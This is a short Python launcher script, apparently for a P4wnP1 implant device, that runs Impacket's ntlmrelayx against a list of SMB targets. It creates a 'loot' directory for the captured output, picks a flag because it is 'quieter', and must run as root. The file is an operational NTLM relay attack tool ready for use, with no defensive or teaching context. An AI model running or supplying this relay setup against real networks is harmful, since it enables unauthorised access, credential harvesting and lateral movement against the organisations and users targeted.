#!/usr/bin/env python3
import os, subprocess, sys, pathlib

TARGETS = os.getenv("RELAY_TARGETS", "/opt/p4wnp1/config/relay_targets.txt")
LOOT    = os.getenv("RELAY_LOOT", "/opt/p4wnp1/loot/ntlmrelayx")
IFACE   = os.getenv("IFACE", "usb0")  # or wlan0

def main():
    pathlib.Path(LOOT).mkdir(parents=True, exist_ok=True)
    if not os.path.exists(TARGETS):
        open(TARGETS, "w").write("# one host per line, e.g.\n# smb://10.0.0.10\n")
    args = [
        "ntlmrelayx.py",
        "-tf", TARGETS,
        "-smb2support",
        "-of", LOOT,
        "--no-wcf"  # quieter
    ]
    print("[+] ntlmrelayx:", " ".join(args))
    subprocess.run(args, check=True)

if __name__=="__main__":
    if os.geteuid()!=0: print("Run as root", file=sys.stderr); sys.exit(1)
    main()
